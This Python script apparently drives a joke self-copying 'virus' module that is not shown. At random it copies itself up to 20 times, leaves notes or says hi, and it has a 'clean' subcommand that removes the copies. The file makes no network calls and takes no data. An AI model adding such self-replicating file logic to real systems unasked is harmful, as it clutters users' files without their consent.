import sys
import random

import constants
import virus

if __name__ == '__main__':
    if len(sys.argv) > 2:
        # too many args
        print("I don't like more than one arguments! So, no thank you.")
        sys.exit(1)

    # init virus
    virus = virus.Virus('Thank you', 'main' if constants.TESTING else 'thank-you')
    if len(sys.argv) == 2:
        subcmd = sys.argv[1]
        if subcmd == 'clean':
            print('Removed %d virus files. No need to thank me.' % virus.clean_directory())
        else:
            print('Unknown subcommand: \'%s\'' % subcmd)
    else:
        # do work
        for _ in range(random.randint(0, 5)):
            r = random.randint(0, 3)
            if r == 0:
                for _ in range(0, random.randint(0, 20)): virus.copy()
            elif r == 1:
                virus.leave_note()
            else: virus.say_hi()